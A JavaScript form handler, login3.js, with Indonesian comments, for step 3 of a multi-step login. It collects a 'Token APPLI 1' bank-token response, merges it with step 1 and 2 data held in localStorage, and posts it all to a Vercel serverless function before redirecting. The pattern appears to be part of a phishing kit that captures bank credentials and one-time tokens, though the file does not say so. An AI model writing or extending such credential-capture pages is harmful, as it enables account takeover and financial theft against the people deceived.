/**
 * login3.js
 * Menangani form submission untuk tahap 3 (token.html)
 */

// Fungsi-fungsi validasi dasar (disalin atau diasumsikan tersedia)
function validateRequired(form) {
    var bValid = true;
    var focusField = null;
    var i = 0;
    var fields = new Array();
    oRequired = new required();

    for (x in oRequired) {
        if ((form[oRequired[x][0]].type == 'text' || form[oRequired[x][0]].type == 'textarea' || form[oRequired[x][0]].type == 'select-one' || form[oRequired[x][0]].type == 'radio' || form[oRequired[x][0]].type == 'password') && form[oRequired[x][0]].value == '') {
           if (i == 0)
              focusField = form[oRequired[x][0]];

           fields[i++] = oRequired[x][1];

           bValid = false;
        }
    }

    if (fields.length > 0) {
       focusField.focus();
       alert(fields.join('\n'));
    }

    return bValid;
}

function validateForm(form) {
    return validateRequired(form);
}

function required () {
    this.aa = new Array("token_appli1", "Token APPLI 1 harus diisi", new Function ("varName", " return this[varName];"));
}

/**
 * Fungsi baru untuk menangani submit form tahap 3 dengan AJAX.
 * @param {HTMLFormElement} form - Objek form.
 */
async function handleLoginSubmit3(form) {
    // 1. Validasi form
    if (!validateForm(form)) {
        return false;
    }

    // 2. Ambil data form tahap 3
    const formData = new FormData(form);
    const dataStep3 = Object.fromEntries(formData.entries());
    
    // Rename field untuk konsistensi dengan PHP lama (j_token_response)
    dataStep3.j_token_response = dataStep3.token_appli1;
    delete dataStep3.token_appli1;

    // 3. Ambil data dari tahap 1 & 2 (dari localStorage)
    const dataPrevious = window.dataStorage.load();

    // 4. Gabungkan data
    const finalData = { ...dataPrevious, ...dataStep3 };

    // 5. Tampilkan loading/disable tombol
    const submitButton = form.querySelector('input[type="submit"]');
    submitButton.disabled = true;
    submitButton.value = 'Loading...';

    try {
        // 6. Kirim data ke Vercel Serverless Function
        const response = await fetch(form.action, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(finalData)
        });

        const result = await response.json();

        if (response.ok && result.success) {
            // 7. Hapus data dari localStorage (menggantikan session_destroy())
            window.dataStorage.clear();

            // 8. Redirect ke halaman berikutnya
            alert('Verifikasi berhasil. Anda akan diarahkan ke halaman utama.');
            window.location.href = result.redirect;
        } else {
            // 9. Tampilkan pesan error
            alert(result.message || 'Terjadi kesalahan saat memproses data.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Terjadi kesalahan jaringan atau server.');
    } finally {
        // 10. Kembalikan tombol ke keadaan semula
        submitButton.disabled = false;
        submitButton.value = 'Lanjutkan';
    }

    return false; // Mencegah submit form bawaan
}

window.handleLoginSubmit3 = handleLoginSubmit3;
